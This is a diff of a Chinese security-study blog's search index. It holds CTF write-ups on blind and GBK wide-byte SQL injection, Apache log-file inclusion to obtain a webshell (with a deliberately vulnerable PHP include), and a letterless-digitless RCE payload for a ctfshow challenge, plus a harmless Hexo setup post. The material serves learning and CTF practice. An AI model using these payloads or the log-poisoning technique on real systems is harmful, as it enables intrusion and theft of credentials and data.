-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
-<p>或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
-<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
-<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
-<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
-<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
-<p>id=-1%df%27union select 1,user(),3–+</p>
-<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
-<p>一般产生宽字节注入的PHP函数：</p>
-<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
-<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
-<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
-<p>3.mysql_real_escape_string()：转义下列字符：</p>
-<p>\x00 \n \r \ ’ &quot; \x1a</p>
-<p>（防御，将mysql设置为gbk即可）</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ssh弱口令爆破远程登录渗透过程</title>
     <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
@@ -2103,6 +2103,43 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
+    <title>文件日志包含漏洞</title>
+    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
+<a id="more"></a>
+<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
+<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
+<p><strong>注意：需要开启服务器记录日志功能</strong></p>
+<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
+<p>apache一般是/var/log/apache/access.log。：</p>
+<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
+<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
+<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
+<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
+<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
+<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
+<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
+<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
+<p><strong>ctfshow -web-4</strong></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件包含</category>
+      </categories>
+  </entry>
+  <entry>
     <title>phar及zip文件包含</title>
     <url>/2020/12/06/zip%E5%92%8Cphar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>phar与zip协议的文件包含</p>
@@ -2139,50 +2176,6 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>文件包含</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>利用hexo+github搭建blog小结</title>
-    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
-    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
-<a id="more"></a>
-<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
-<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
-<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
-<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
-<p>修改npm的资源镜像链接:</p>
-<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
-<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
-<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
-<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
-<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
-<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
-<p>买好之后去域名控制台，选择解析</p>
-<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
-<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
-<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
-<p>再使用git bash部署一次即可</p>
-<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
-<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
-<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
-<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
-<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
-<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
-<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
-<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
-<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
-<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
-<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
-<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
-<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
-<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
-<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
-<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
-<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-        <category>hexo</category>
       </categories>
   </entry>
   <entry>
@@ -2263,83 +2256,47 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>文件日志包含漏洞</title>
-    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
+    <title>利用hexo+github搭建blog小结</title>
+    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
 <a id="more"></a>
-<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
-<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
-<p><strong>注意：需要开启服务器记录日志功能</strong></p>
-<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
-<p>apache一般是/var/log/apache/access.log。：</p>
-<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
-<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
-<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
-<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
-<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
-<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
-<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
-<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
-<p><strong>ctfshow -web-4</strong></p>
+<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
+<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
+<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
+<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
+<p>修改npm的资源镜像链接:</p>
+<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
+<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
+<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
+<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
+<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
+<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
+<p>买好之后去域名控制台，选择解析</p>
+<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
+<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
+<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
+<p>再使用git bash部署一次即可</p>
+<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
+<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
+<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
+<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
+<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
+<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
+<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
+<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
+<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
+<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
+<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
+<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
+<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
+<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
+<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
+<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
+<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
 ]]></content>
       <categories>
-        <category>web技术学习</category>
-        <category>文件包含</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>无数字字母rce</title>
-    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
-    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
-<a id="more"></a>
-<p><strong>我们根据这一题直接进入主题</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤了字母，数字。</p>
-<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
-<p><strong>先说一下这一题的解题思路：</strong></p>
-<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
-**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
-<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
-<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>然后直接抓包</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-接下来构造poc命令<br>
-<code>?c=.+/???/????????[@-[]</code><br>
-用到Linux下的glob通配符：</p>
-<ul>
-<li><code>*</code>可以代替0个及以上任意字符</li>
-<li><code>?</code>可以代表1个任意字符<br>
-注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
-<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<p>介绍一下<strong>bin目录:</strong></p>
-<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
-<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
-<p>成功遍历当前目录文件<br>
-<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>直接cat 得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>补充</strong></p>
-<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
-<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
